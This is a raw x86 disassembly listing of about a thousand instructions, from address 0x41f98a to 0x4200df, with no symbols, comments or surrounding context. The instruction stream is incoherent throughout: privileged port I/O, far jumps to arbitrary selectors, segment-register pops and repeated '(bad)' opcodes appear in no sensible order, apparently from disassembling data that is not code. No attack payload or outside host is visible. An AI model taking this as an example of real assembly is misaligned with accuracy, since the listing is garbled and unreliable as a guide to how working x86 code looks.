  41f98a:	out    dx,al
  41f98b:	mov    ds:0x144b5741,eax
  41f990:	sbb    al,0xed
  41f992:	ins    BYTE PTR es:[edi],dx
  41f993:	stos   DWORD PTR es:[edi],eax
  41f994:	repnz arpl ax,cx
  41f997:	mov    ebx,0xe8e186ac
  41f99c:	sahf   
  41f99d:	mov    esi,0x670098f4
  41f9a2:	dec    eax
  41f9a3:	mov    bl,bh
  41f9a5:	ficom  WORD PTR [esp+ecx*8+0x7d23d09e]
  41f9ac:	test   BYTE PTR [ebp-0x214ea5b3],cl
  41f9b2:	jl     0x41f9b9
  41f9b4:	xchg   edi,eax
  41f9b5:	xor    DWORD PTR [ecx+esi*1+0x71],ebx
  41f9b9:	aaa    
  41f9ba:	jo     0x41f9b2
  41f9bc:	pop    ss
  41f9bd:	jl     0x41f9b6
  41f9bf:	fsubr  QWORD PTR [eax-0x37c98741]
  41f9c5:	xchg   BYTE PTR [ebp+0x37],al
  41f9c8:	lods   eax,DWORD PTR ds:[esi]
  41f9c9:	in     eax,dx
  41f9ca:	add    al,0x7
  41f9cc:	pop    edx
  41f9cd:	mov    bh,BYTE PTR [ecx]
  41f9cf:	fisub  WORD PTR [eax+0x61909a0]
  41f9d5:	inc    edi
  41f9d6:	xchg   DWORD PTR [edi-0x15],ebp
  41f9d9:	fstp   QWORD PTR [eax-0x2912d301]
  41f9df:	dec    ebx
  41f9e0:	mov    esp,0xeb09597d
  41f9e5:	test   BYTE PTR ds:0x1704d800,0xbc
  41f9ec:	cmp    bh,ah
  41f9ee:	add    bh,BYTE PTR [ecx]
  41f9f0:	ins    BYTE PTR es:[edi],dx
  41f9f1:	cmp    eax,esp
  41f9f3:	mov    DWORD PTR [bp+di],esp
  41f9f6:	mov    esp,edi
  41f9f8:	mov    ebp,0x8cd7e524
  41f9fd:	fsub   QWORD PTR [edi-0x15]
  41fa00:	fwait
  41fa01:	pop    ds
  41fa02:	gs jmp 0xf800:0xc63d9e75
  41fa0a:	jmp    0xad0ec03b
  41fa0f:	mov    eax,ds:0x37558824
  41fa14:	sahf   
  41fa15:	icebp  
  41fa16:	dec    ebp
  41fa17:	mov    ch,cl
  41fa19:	cmp    bh,0xc1
  41fa1c:	dec    esi
  41fa1d:	inc    ebx
  41fa1e:	stc    
  41fa1f:	xchg   DWORD PTR [edx+0x56],ebx
  41fa22:	mov    bh,0xab
  41fa24:	ja     0x41f9a6
  41fa26:	xor    ch,BYTE PTR [ebx+0x10678ee7]
  41fa2c:	je     0x41fa1a
  41fa2e:	jmp    0x5cdb:0x80d5
  41fa34:	mov    edx,0x5c3d4c9d
  41fa39:	aam    0x93
  41fa3b:	mov    edx,0x4dbd4861
  41fa40:	add    BYTE PTR [edx],ch
  41fa42:	push   edi
  41fa43:	lahf   
  41fa44:	mov    eax,0x47bea40a
  41fa49:	fmul   st,st(3)
  41fa4b:	popa   
  41fa4c:	mov    BYTE PTR [edx-0x80],0x7a
  41fa50:	inc    ecx
  41fa51:	push   ss
  41fa52:	push   edx
  41fa53:	jg     0x41fa2c
  41fa55:	aad    0x7a
  41fa57:	xchg   dl,al
  41fa59:	out    0x6f,al
  41fa5b:	or     bh,dh
  41fa5d:	mov    ds:0x4bbfd052,eax
  41fa62:	pop    es
  41fa63:	push   cs
  41fa64:	mov    BYTE PTR [esi-0x2c52c57f],al
  41fa6a:	repz jmp 0x41fa4c
  41fa6d:	mov    ebx,0x339aa59f
  41fa72:	retf   0x2adc
  41fa75:	ja     0x41facc
  41fa77:	mov    WORD PTR [ebx-0x7a],gs
  41fa7a:	lods   al,BYTE PTR ds:[esi]
  41fa7b:	int3   
  41fa7c:	enter  0x680c,0xee
  41fa80:	lock and ah,ah
  41fa83:	and    eax,0x1c576163
  41fa88:	add    ebx,esp
  41fa8a:	or     DWORD PTR [edx],esp
  41fa8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa8d:	mov    es,WORD PTR [ecx+0x23]
  41fa90:	lahf   
  41fa91:	xor    ch,dl
  41fa93:	sub    edi,ecx
  41fa95:	pop    ebp
  41fa96:	sub    eax,0x4a2e1b8a
  41fa9b:	repnz cmp ebx,DWORD PTR [ebx]
  41fa9e:	int3   
  41fa9f:	addr16 pop ds
  41faa1:	mov    ebx,0x9ab2854f
  41faa6:	add    DWORD PTR [edi+esi*1],edi
  41faa9:	ins    DWORD PTR es:[edi],dx
  41faaa:	bound  edi,QWORD PTR [esi+0x1]
  41faad:	jne    0x41fb25
  41faaf:	xchg   esp,eax
  41fab0:	pop    edx
  41fab1:	mov    BYTE PTR [edx-0x3c6f223b],bl
  41fab7:	dec    edi
  41fab8:	push   cs
  41fab9:	push   es
  41faba:	push   eax
  41fabb:	and    edi,eax
  41fabd:	and    ecx,DWORD PTR [ecx+0x5]
  41fac0:	sub    al,0x6f
  41fac2:	mov    DWORD PTR [ecx],eax
  41fac4:	popa   
  41fac5:	xchg   eax,esi
  41fac7:	sbb    eax,0x800f2133
  41facc:	lahf   
  41facd:	adc    ah,al
  41facf:	mov    bh,0xb7
  41fad1:	xchg   ecx,eax
  41fad2:	retf   0x45dd
  41fad5:	rcr    bh,1
  41fad7:	repnz mov eax,ds:0x210d111d
  41fadd:	popf   
  41fade:	jbe    0x41fa66
  41fae0:	test   BYTE PTR [edi+ebx*1-0x7],al
  41fae4:	pop    ds
  41fae5:	sahf   
  41fae6:	mov    bl,0x1d
  41fae8:	xor    BYTE PTR [ecx+edx*8+0x537dfc40],al
  41faef:	sub    al,0xb5
  41faf1:	aam    0x27
  41faf3:	and    edx,DWORD PTR [ecx+0x4c357057]
  41faf9:	add    al,dl
  41fafb:	mov    ds:0x86cd37c8,eax
  41fb00:	aam    0x3b
  41fb02:	xchg   DWORD PTR [ecx],ebx
  41fb04:	jl     0x41fb64
  41fb06:	stos   DWORD PTR es:[edi],eax
  41fb07:	popf   
  41fb08:	jne    0x41fb03
  41fb0a:	clc    
  41fb0b:	push   ecx
  41fb0c:	aaa    
  41fb0d:	rol    DWORD PTR [esi-0x275569e3],cl
  41fb13:	das    
  41fb14:	shr    ecx,cl
  41fb16:	mov    eax,ds:0x5b43fbe3
  41fb1b:	mov    eax,0xd65d3e16
  41fb20:	jae    0x41fb02
  41fb22:	mov    eax,0x67234c85
  41fb27:	or     eax,ecx
  41fb29:	in     eax,dx
  41fb2a:	inc    eax
  41fb2b:	pop    edi
  41fb2c:	ret    
  41fb2d:	data16 jg 0x41fb29
  41fb30:	pop    eax
  41fb31:	jge    0x41fb18
  41fb33:	jle    0x41fb9e
  41fb35:	adc    al,BYTE PTR [edi-0xb]
  41fb38:	pop    eax
  41fb39:	jns    0x41fb54
  41fb3b:	stos   WORD PTR es:[edi],ax
  41fb3d:	sbb    al,0x7c
  41fb3f:	(bad)  
  41fb40:	sahf   
  41fb41:	aas    
  41fb42:	shl    bp,cl
  41fb45:	mov    ds:0xfdbe5970,al
  41fb4a:	icebp  
  41fb4b:	pop    es
  41fb4c:	out    0x77,eax
  41fb4e:	sbb    al,0xb3
  41fb50:	jge    0x41fb27
  41fb52:	push   ebx
  41fb53:	scas   eax,DWORD PTR es:[edi]
  41fb54:	outs   dx,DWORD PTR ds:[esi]
  41fb56:	es mov ebp,0x19336e37
  41fb5c:	jle    0x41fb08
  41fb5e:	rol    DWORD PTR [ebx-0x3e91eebf],cl
  41fb64:	scas   al,BYTE PTR es:[edi]
  41fb65:	pop    ebp
  41fb66:	adc    esp,esp
  41fb68:	xchg   DWORD PTR [edi-0x73],esi
  41fb6b:	in     eax,dx
  41fb6c:	repz pop edi
  41fb6e:	out    0x7c,al
  41fb70:	sbb    al,0x53
  41fb72:	aaa    
  41fb73:	ret    
  41fb74:	xchg   BYTE PTR [eax+0x47],dh
  41fb77:	jmp    0x2e2e2b38
  41fb7c:	out    0x51,eax
  41fb7e:	cld    
  41fb7f:	push   esp
  41fb80:	fmul   DWORD PTR [esi]
  41fb82:	add    cl,BYTE PTR ss:[edx+ebp*8+0xd7ca3be]
  41fb8a:	in     eax,0xec
  41fb8c:	and    eax,0x55e446d4
  41fb91:	fidivr DWORD PTR [ecx]
  41fb93:	cmp    al,0xd2
  41fb95:	rcl    ah,cl
  41fb97:	sar    ebp,0x7e
  41fb9a:	ins    BYTE PTR es:[edi],dx
  41fb9b:	dec    edx
  41fb9c:	or     ch,dh
  41fb9e:	leave  
  41fb9f:	fimul  DWORD PTR [edi]
  41fba1:	and    al,0xb8
  41fba3:	cmp    DWORD PTR [edx-0x6],0x9455e990
  41fbaa:	sti    
  41fbab:	adc    DWORD PTR [edx-0x63954489],esp
  41fbb1:	add    DWORD PTR [esi+0xa],ebx
  41fbb4:	adc    DWORD PTR [edx],edx
  41fbb6:	fidiv  WORD PTR ds:0xd9af1a7
  41fbbc:	dec    esi
  41fbbd:	into   
  41fbbe:	mov    edi,0xb9f0a688
  41fbc3:	ds jp  0x41fc1a
  41fbc6:	cld    
  41fbc7:	nop
  41fbc8:	jbe    0x41fbfd
  41fbca:	mov    al,ds:0xe1d59761
  41fbcf:	fimul  WORD PTR [eax+0x3e]
  41fbd2:	enter  0x173d,0xfe
  41fbd6:	loopne 0x41fbd4
  41fbd8:	mov    cs,WORD PTR [edi]
  41fbda:	dec    esp
  41fbdb:	xor    edx,ebp
  41fbdd:	pusha  
  41fbde:	push   edx
  41fbdf:	(bad)  
  41fbe0:	and    al,0x5
  41fbe2:	jl     0x41fc0b
  41fbe4:	stos   BYTE PTR es:[edi],al
  41fbe5:	aam    0x4
  41fbe7:	dec    esp
  41fbe8:	sub    eax,0x34c61f5d
  41fbed:	xchg   esp,eax
  41fbee:	mov    ch,0x46
  41fbf0:	(bad)  
  41fbf2:	retf   
  41fbf3:	lock xor esp,DWORD PTR ds:0x1f279dc5
  41fbfa:	mov    bh,0xf0
  41fbfc:	push   ds
  41fbfd:	or     DWORD PTR [esi+0x46],ecx
  41fc00:	and    BYTE PTR [ebx],0x4f
  41fc03:	mov    cl,0x4d
  41fc05:	xchg   esp,eax
  41fc06:	cmp    DWORD PTR [edx+0x79],eax
  41fc09:	mov    esp,0x837f955f
  41fc0e:	xor    ebp,0xbaa37e26
  41fc14:	pop    ds
  41fc15:	pop    ebp
  41fc16:	pop    edi
  41fc17:	fnstcw WORD PTR [edx+0x64]
  41fc1a:	xchg   ecx,eax
  41fc1b:	(bad)  
  41fc1c:	mov    al,0xf2
  41fc1e:	lds    esp,FWORD PTR [ecx-0x1c6ab6ca]
  41fc24:	mov    dl,0x7
  41fc26:	out    0xa7,eax
  41fc28:	test   eax,0x459747c9
  41fc2d:	pop    ss
  41fc2e:	out    0x5f,eax
  41fc30:	xchg   al,bh
  41fc32:	xchg   ebx,eax
  41fc33:	sub    BYTE PTR [ecx+0x782db54d],dh
  41fc39:	jp     0x41fbdc
  41fc3b:	mov    ebx,0x62f180fd
  41fc40:	xchg   edx,eax
  41fc41:	push   cs
  41fc42:	cmp    eax,0x31cc65aa
  41fc47:	mov    ah,0x83
  41fc49:	jne    0x41fc8a
  41fc4b:	scas   eax,DWORD PTR es:[edi]
  41fc4c:	shl    BYTE PTR [eax],1
  41fc4e:	daa    
  41fc4f:	loop   0x41fc02
  41fc51:	push   edx
  41fc52:	mov    edi,0xaff4b20
  41fc57:	mov    ebp,0x8c70aa59
  41fc5c:	cmp    ch,BYTE PTR [ebx+0x3e216a8e]
  41fc62:	test   eax,0xce90d6a4
  41fc67:	sbb    eax,0xf6ad8dd5
  41fc6c:	adc    DWORD PTR [ecx],eax
  41fc6e:	xchg   ebp,eax
  41fc6f:	sbb    BYTE PTR [ebx-0x24],0xf6
  41fc73:	enter  0x2ed1,0xc1
  41fc77:	jl     0x41fce7
  41fc79:	ss push ds
  41fc7b:	arpl   WORD PTR [esi+0x65],di
  41fc7e:	pop    eax
  41fc7f:	jb     0x41fcb5
  41fc81:	sbb    al,0xdf
  41fc83:	lods   eax,DWORD PTR ds:[esi]
  41fc84:	jmp    0xe7b6fd42
  41fc89:	jl     0x41fca4
  41fc8b:	(bad)  
  41fc8c:	lods   eax,DWORD PTR ds:[esi]
  41fc8d:	data16 jne 0x41fc41
  41fc90:	bound  esp,QWORD PTR [eax]
  41fc92:	div    BYTE PTR [ebx]
  41fc94:	iret   
  41fc95:	pop    edi
  41fc96:	call   0xeb39:0x10c997bf
  41fc9d:	lods   eax,DWORD PTR ds:[esi]
  41fc9e:	mov    edi,0x75ce354d
  41fca3:	ins    BYTE PTR es:[edi],dx
  41fca4:	call   DWORD PTR [ebx-0x53]
  41fca7:	add    DWORD PTR ds:0xc48a78ca,esi
  41fcad:	loop   0x41fcb6
  41fcaf:	adc    DWORD PTR [ebx],ebp
  41fcb1:	lods   al,BYTE PTR ds:[esi]
  41fcb2:	fcmovu st,st(7)
  41fcb4:	in     al,0x3c
  41fcb6:	outs   dx,DWORD PTR ds:[esi]
  41fcb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcb8:	mov    ds:0xf1325077,al
  41fcbd:	cmp    eax,0x2331acbc
  41fcc2:	loopne 0x41fc4e
  41fcc4:	or     BYTE PTR [ebp+0x77],bl
  41fcc7:	cmp    BYTE PTR [ecx],cl
  41fcc9:	inc    eax
  41fcca:	mov    esi,0xb80eca6
  41fccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcd0:	lds    edx,FWORD PTR [ebp+eiz*1+0x39]
  41fcd4:	jge    0x41fc73
  41fcd6:	stos   BYTE PTR es:[edi],al
  41fcd7:	jae    0x41fca5
  41fcd9:	clc    
  41fcda:	fidivr WORD PTR [esi]
  41fcdc:	mov    dh,0x91
  41fcde:	jo     0x41fd2e
  41fce0:	popf   
  41fce1:	jnp    0x41fd01
  41fce3:	adc    BYTE PTR [edi],0x46
  41fce6:	rcr    DWORD PTR [esp+ecx*1-0x6c],1
  41fcea:	lahf   
  41fceb:	cmp    BYTE PTR [edi-0x1b0ff366],dh
  41fcf1:	pusha  
  41fcf2:	xor    DWORD PTR [eax+ecx*4-0x540c6289],esp
  41fcf9:	jmp    0x516d:0x3d74
  41fcff:	dec    ebx
  41fd00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd01:	cli    
  41fd02:	lock jbe 0x41fd60
  41fd05:	lahf   
  41fd06:	or     esi,DWORD PTR [eax-0x1a790dd1]
  41fd0c:	aas    
  41fd0d:	imul   edx,DWORD PTR [ebp+0x5a],0x95640eb1
  41fd14:	icebp  
  41fd15:	mov    esp,0x2ffe527e
  41fd1a:	jmp    FWORD PTR [eax+eax*8+0x6d]
  41fd1e:	aad    0x9
  41fd20:	or     eax,0x620681be
  41fd25:	push   eax
  41fd26:	or     al,0xd8
  41fd28:	rcr    edx,0xf
  41fd2b:	sbb    BYTE PTR [ebx-0xdb1a19d],dh
  41fd31:	stos   BYTE PTR es:[edi],al
  41fd32:	pop    ebx
  41fd33:	rcl    BYTE PTR [eax-0x444d881],1
  41fd39:	test   eax,0x3d3e86e
  41fd3e:	cmc    
  41fd3f:	bndstx [ecx],bnd3
  41fd42:	sub    BYTE PTR [edx+esi*2-0xf],ch
  41fd46:	dec    edi
  41fd47:	les    eax,FWORD PTR [edi+0x21bc58b7]
  41fd4d:	xlat   BYTE PTR ds:[ebx]
  41fd4e:	add    eax,0x56703111
  41fd53:	dec    edx
  41fd54:	es rcr bl,0xfe
  41fd58:	outs   dx,DWORD PTR ds:[esi]
  41fd59:	mov    edx,0x8710107c
  41fd5e:	push   ebx
  41fd5f:	imul   DWORD PTR [edi+ebx*4]
  41fd62:	push   ecx
  41fd63:	(bad)  [ecx]
  41fd65:	div    DWORD PTR [edx-0x51]
  41fd68:	in     al,0x12
  41fd6a:	mov    bh,0x24
  41fd6c:	ficom  DWORD PTR [edx]
  41fd6e:	push   ecx
  41fd6f:	nop
  41fd70:	je     0x41fd3f
  41fd72:	clc    
  41fd73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd74:	gs pusha 
  41fd76:	and    esp,edx
  41fd78:	retf   0xd3db
  41fd7b:	(bad)  
  41fd7c:	pusha  
  41fd7d:	xabort 0xa6
  41fd80:	pop    ds
  41fd81:	dec    edi
  41fd82:	addr16 (bad) 
  41fd84:	(bad)  
  41fd85:	lock inc ebx
  41fd87:	xchg   edx,eax
  41fd88:	push   cs
  41fd89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd8a:	jmp    FWORD PTR [edx+0x22]
  41fd8d:	repz jg 0x41fd43
  41fd90:	outs   dx,BYTE PTR ds:[esi]
  41fd91:	adc    esp,0x424c950d
  41fd97:	ins    BYTE PTR es:[edi],dx
  41fd98:	add    DWORD PTR [ecx+0x119e84d3],0xd24de8ea
  41fda2:	iret   
  41fda3:	pop    es
  41fda4:	fsub   DWORD PTR [edx+0x3d135e36]
  41fdaa:	mov    BYTE PTR [eax-0x7ab7809e],dh
  41fdb0:	test   eax,0xe29ef09b
  41fdb5:	push   ebx
  41fdb6:	or     al,0x52
  41fdb8:	add    al,BYTE PTR [ecx+0x7dbf9dfb]
  41fdbe:	test   al,0x3d
  41fdc0:	or     ebp,DWORD PTR [esi-0x58]
  41fdc3:	scas   al,BYTE PTR es:[edi]
  41fdc4:	mov    dh,BYTE PTR [eax-0x787e972d]
  41fdca:	shl    DWORD PTR [ebx+0x6f],cl
  41fdcd:	stc    
  41fdce:	xor    DWORD PTR [eax],ebx
  41fdd0:	and    eax,0x368f2e99
  41fdd5:	and    eax,0x6a735de9
  41fdda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fddb:	push   ecx
  41fddc:	jmp    0x4d650b92
  41fde1:	into   
  41fde2:	add    eax,0xb361aac
  41fde7:	jmp    0x41fe4b
  41fde9:	dec    edx
  41fdea:	pop    es
  41fdeb:	pusha  
  41fdec:	bound  edi,QWORD PTR [esi]
  41fdee:	aaa    
  41fdef:	push   ds
  41fdf0:	ja     0x41fdcd
  41fdf2:	xlat   BYTE PTR ds:[ebx]
  41fdf3:	xchg   BYTE PTR [edi],bh
  41fdf5:	jae    0x41fda0
  41fdf7:	into   
  41fdf8:	iret   
  41fdf9:	out    0x27,eax
  41fdfb:	out    0x34,al
  41fdfd:	ficomp WORD PTR [edi+0x4b]
  41fe00:	ins    BYTE PTR es:[edi],dx
  41fe01:	jmp    0x2d2c9518
  41fe06:	retf   0xd803
  41fe09:	shl    DWORD PTR [edx],0x6c
  41fe0c:	pop    ss
  41fe0d:	cli    
  41fe0e:	push   esi
  41fe0f:	mov    WORD PTR [edx],gs
  41fe11:	xor    BYTE PTR [edx+ebx*1-0x142d7663],ah
  41fe18:	mov    edx,0x933efef4
  41fe1d:	imul   ebx,DWORD PTR [esi],0x12
  41fe20:	test   al,0x85
  41fe22:	jl     0x41fe84
  41fe24:	fs or  ah,cl
  41fe27:	jg     0x41fdb6
  41fe29:	pop    ss
  41fe2a:	ins    BYTE PTR es:[edi],dx
  41fe2b:	pop    es
  41fe2c:	retf   
  41fe2d:	mov    esi,0x1ea4679e
  41fe32:	mov    ch,0x41
  41fe34:	imul   edi,DWORD PTR [ebx-0x680b76be],0xffffff83
  41fe3b:	inc    edx
  41fe3c:	dec    esi
  41fe3d:	jp     0x41fe01
  41fe3f:	lahf   
  41fe40:	fsubr  st,st(5)
  41fe42:	mov    BYTE PTR [esi],0x51
  41fe45:	scas   eax,DWORD PTR es:[edi]
  41fe46:	cmp    DWORD PTR [edx-0x604ea3b6],ecx
  41fe4c:	mov    ch,0x92
  41fe4e:	xchg   DWORD PTR [edx],ebx
  41fe50:	pop    ebx
  41fe51:	and    edx,DWORD PTR gs:[edi-0x39cabc54]
  41fe58:	and    al,0x71
  41fe5a:	jne    0x41feb1
  41fe5c:	add    eax,0xd99ae22f
  41fe61:	pop    ecx
  41fe62:	xor    BYTE PTR [eax-0x7a],bl
  41fe65:	fwait
  41fe66:	sub    eax,0x78a1a2d4
  41fe6b:	xchg   DWORD PTR [esi-0x35a9ad1a],ecx
  41fe71:	fnstenv [edi]
  41fe73:	loope  0x41fea3
  41fe75:	inc    esp
  41fe76:	xchg   BYTE PTR [ebx+0x3c],al
  41fe79:	popa   
  41fe7a:	ja     0x41fe9d
  41fe7c:	sahf   
  41fe7d:	stc    
  41fe7e:	popa   
  41fe7f:	iret   
  41fe80:	xchg   ebx,eax
  41fe81:	and    ebp,ecx
  41fe83:	fbld   TBYTE PTR [ebx]
  41fe85:	shr    BYTE PTR [edx-0x60],1
  41fe88:	push   esi
  41fe89:	add    al,0xd8
  41fe8b:	aam    0x69
  41fe8d:	jns    0x41fe7f
  41fe8f:	dec    esp
  41fe90:	sbb    al,0x5c
  41fe92:	ja     0x41fe6b
  41fe94:	popf   
  41fe95:	pop    eax
  41fe96:	jne    0x41fe7c
  41fe98:	jo     0x41feda
  41fe9a:	imul   esi,ecx,0xee4de1e1
  41fea0:	mov    eax,ds:0x530a85c7
  41fea5:	mov    ds:0x865e7ec,eax
  41feaa:	cli    
  41feab:	popf   
  41feac:	or     eax,0x2ea266cf
  41feb1:	push   cs
  41feb2:	(bad)  
  41feb3:	jl     0x41fe58
  41feb5:	and    dh,ch
  41feb7:	popa   
  41feb8:	pushf  
  41feb9:	push   0xd730e085
  41febe:	add    ebx,DWORD PTR [edx-0x696c0b89]
  41fec4:	sti    
  41fec5:	jge    0x41fe6f
  41fec7:	jne    0x41feac
  41fec9:	pop    cx
  41fecb:	int3   
  41fecc:	push   eax
  41fecd:	jg     0x41fe9e
  41fecf:	jp     0x41fec6
  41fed1:	sar    DWORD PTR [esi+0x6c],cl
  41fed4:	mov    edi,0x9f4e6c98
  41fed9:	into   
  41feda:	aad    0xfb
  41fedc:	test   eax,0xb86c4969
  41fee1:	(bad)  
  41fee2:	pop    esp
  41fee3:	jo     0x41fea7
  41fee5:	dec    eax
  41fee6:	jmp    0xf93fad84
  41feeb:	loopne 0x41fedc
  41feed:	dec    edi
  41feee:	icebp  
  41feef:	xlat   BYTE PTR ds:[ebx]
  41fef0:	div    BYTE PTR [ebx-0x31]
  41fef3:	lods   eax,DWORD PTR ds:[esi]
  41fef4:	mov    ebp,0xbe43d0b9
  41fef9:	and    DWORD PTR [esi+0x17],ecx
  41fefc:	popa   
  41fefd:	frstor [ecx-0x2b]
  41ff00:	mov    ecx,0xd15950aa
  41ff05:	out    0x80,al
  41ff07:	inc    edi
  41ff08:	lods   al,BYTE PTR ds:[esi]
  41ff09:	pop    eax
  41ff0a:	and    BYTE PTR [ebx+0x814f853],bh
  41ff10:	sbb    eax,0x267fb60f
  41ff15:	repz cli 
  41ff17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff18:	push   0xffffffc5
  41ff1a:	xchg   DWORD PTR [ebx-0xd86fe1a],esp
  41ff20:	add    BYTE PTR [eax],al
  41ff22:	add    BYTE PTR [eax],al
  41ff24:	add    BYTE PTR [eax],al
  41ff26:	mov    edi,0xed95a576
  41ff2b:	xlat   BYTE PTR ds:[ebx]
  41ff2c:	mov    edi,0xa0a36c7e
  41ff31:	shl    BYTE PTR [eax+0x52],0x7f
  41ff35:	push   ebx
  41ff36:	scas   eax,DWORD PTR es:[edi]
  41ff37:	test   DWORD PTR [ecx],0x72200
  41ff3d:	add    ah,cl
  41ff3f:	mov    cl,dl
  41ff41:	mov    eax,ds:0xdd2a7962
  41ff46:	mov    eax,ds:0xbf417de9
  41ff4b:	mov    eax,ds:0x48ca0545
  41ff50:	shl    BYTE PTR [esi+ebx*2+0x38],1
  41ff54:	push   edx
  41ff55:	or     ecx,DWORD PTR [esi+0x52]
  41ff58:	popa   
  41ff59:	ins    DWORD PTR es:[edi],dx
  41ff5a:	rcr    BYTE PTR [eax+0x202b8e07],0x8d
  41ff61:	xchg   ebx,eax
  41ff62:	arpl   WORD PTR [ecx+0x35],si
  41ff65:	loop   0x41ff67
  41ff67:	xor    DWORD PTR [ebp-0x42ffb17d],0xffffffaa
  41ff6e:	ret    0x67ea
  41ff71:	jge    0x41ffa3
  41ff73:	pop    ss
  41ff74:	int    0xc9
  41ff76:	add    DWORD PTR [ebx],ebp
  41ff78:	cli    
  41ff79:	out    dx,al
  41ff7a:	mov    al,0x46
  41ff7c:	inc    edx
  41ff7d:	push   edi
  41ff7e:	mov    ah,0xb
  41ff80:	jl     0x41ff61
  41ff82:	xor    DWORD PTR [edi],eax
  41ff84:	dec    esp
  41ff85:	pop    ecx
  41ff86:	or     DWORD PTR [ecx-0x50],esp
  41ff89:	sar    bl,cl
  41ff8b:	iret   
  41ff8c:	stc    
  41ff8d:	inc    ecx
  41ff8e:	rol    BYTE PTR [ecx+0x6fda40e9],0x4f
  41ff95:	int3   
  41ff96:	push   ss
  41ff97:	loop   0x420012
  41ff99:	pop    edi
  41ff9a:	loop   0x41ffb0
  41ff9c:	xor    ebp,DWORD PTR [edx+eiz*2]
  41ff9f:	sub    ax,0xaad9
  41ffa3:	jg     0x41ff48
  41ffa5:	dec    ebx
  41ffa6:	sti    
  41ffa7:	ins    DWORD PTR es:[edi],dx
  41ffa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffa9:	xchg   edi,eax
  41ffaa:	loop   0x41fffa
  41ffac:	xchg   ebp,eax
  41ffad:	imul   ecx,esi,0xa4f3728d
  41ffb3:	push   esp
  41ffb4:	push   ds
  41ffb5:	xor    al,0x86
  41ffb7:	xchg   ebx,eax
  41ffb8:	fs enter 0x6e21,0x74
  41ffbd:	mov    bh,0x78
  41ffbf:	dec    ebx
  41ffc0:	dec    esi
  41ffc1:	dec    ebx
  41ffc2:	(bad)  [ecx+ebx*8-0x7c869ece]
  41ffc9:	fst    st(0)
  41ffcb:	xchg   edi,eax
  41ffcc:	jge    0x41ffc3
  41ffce:	or     ah,BYTE PTR [edi]
  41ffd0:	test   DWORD PTR [edi+0x62],edi
  41ffd3:	sbb    ecx,DWORD PTR [esi-0x2c]
  41ffd6:	cmp    al,0x67
  41ffd8:	in     al,0xf5
  41ffda:	ss pop ebp
  41ffdc:	in     al,0xb5
  41ffde:	or     BYTE PTR [edi+ebx*2+0x78c37336],0x90
  41ffe6:	std    
  41ffe7:	cmp    ecx,DWORD PTR [ebp+eiz*1+0x34]
  41ffeb:	in     eax,dx
  41ffec:	jle    0x420018
  41ffee:	add    BYTE PTR [esi+ebx*2+0x557f42ee],bl
  41fff5:	popa   
  41fff6:	push   0x11
  41fff8:	ja     0x42000b
  41fffa:	test   DWORD PTR [edx+0x74],ebx
  41fffd:	ins    DWORD PTR es:[edi],dx
  41fffe:	pop    eax
  41ffff:	or     BYTE PTR fs:[esi+ebp*8-0x32acd609],0x98
  420008:	jae    0x420022
  42000a:	imul   ecx,DWORD PTR [edx],0x39aa3025
  420010:	xchg   esp,eax
  420011:	(bad)  
  420012:	call   0x89928d18
  420017:	xchg   edx,eax
  420018:	sbb    cl,ah
  42001a:	sub    al,0xa1
  42001c:	mov    gs,WORD PTR [edx]
  42001e:	adc    al,0x9
  420020:	mov    ebp,0x545f6e9d
  420025:	popf   
  420026:	cmp    al,0xad
  420028:	ftst   
  42002a:	mov    WORD PTR ds:0x7a2e0230,fs
  420030:	xor    al,0x56
  420032:	xchg   edi,eax
  420033:	mov    WORD PTR [ebx-0x8160ba0],es
  420039:	sbb    DWORD PTR [esi-0x71bcd8a4],ebx
  42003f:	aas    
  420040:	push   ebx
  420041:	adc    al,0xd8
  420043:	jge    0x42006b
  420045:	mov    BYTE PTR [esi+eiz*4],al
  420048:	xlat   BYTE PTR ds:[ebx]
  420049:	jmp    0x1426:0xef70d3a6
  420050:	call   0x4c70:0xa912870f
  420057:	aaa    
  420058:	xchg   esp,eax
  420059:	mov    bh,0x8
  42005b:	std    
  42005c:	cmp    ebx,ecx
  42005e:	sahf   
  42005f:	lahf   
  420060:	ja     0x420051
  420062:	xor    eax,0xc56750b1
  420067:	push   ss
  420068:	leave  
  420069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42006a:	and    cl,0x19
  42006d:	imul   esi,edi,0x13
  420070:	jns    0x42002d
  420072:	mov    al,0xb4
  420074:	es add eax,0x7fc8f89e
  42007a:	lods   eax,DWORD PTR ds:[esi]
  42007b:	imul   esi,DWORD PTR [esi],0x6f
  42007e:	mov    ebp,0x3b2767c1
  420083:	push   eax
  420084:	stc    
  420085:	(bad)  
  420086:	aam    0x17
  420088:	loope  0x4200e2
  42008a:	pop    edx
  42008b:	mov    BYTE PTR [edx-0x13d212dd],0xe6
  420092:	loope  0x4200e7
  420094:	jle    0xd5ec2dab
  42009a:	(bad)  
  42009b:	out    0x3,al
  42009d:	pop    esi
  42009e:	dec    edx
  42009f:	jge    0x4200f5
  4200a1:	xchg   edi,eax
  4200a2:	xchg   ebx,eax
  4200a3:	sbb    eax,0x51636c1d
  4200a8:	(bad)  
  4200a9:	xchg   ecx,eax
  4200aa:	dec    ebp
  4200ab:	mov    eax,0x6533dc5d
  4200b0:	mov    DWORD PTR [edx+0x44a9f639],edi
  4200b6:	in     al,dx
  4200b7:	inc    esi
  4200b8:	add    eax,0x169597df
  4200bd:	ja     0x42004b
  4200bf:	nop
  4200c0:	in     eax,0x95
  4200c2:	lods   al,BYTE PTR ds:[esi]
  4200c3:	js     0x42009b
  4200c5:	out    dx,eax
  4200c6:	nop
  4200c7:	xchg   DWORD PTR fs:[ecx-0x7b],ecx
  4200cb:	push   eax
  4200cc:	es out dx,eax
  4200ce:	ja     0x42010e
  4200d0:	ds test eax,0x679eaf31
  4200d6:	mov    al,0xbd
  4200d8:	inc    eax
  4200d9:	cwde   
  4200da:	cwde   
  4200db:	jecxz  0x420072
  4200dd:	pop    ecx
  4200de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200df:	pop    ebp
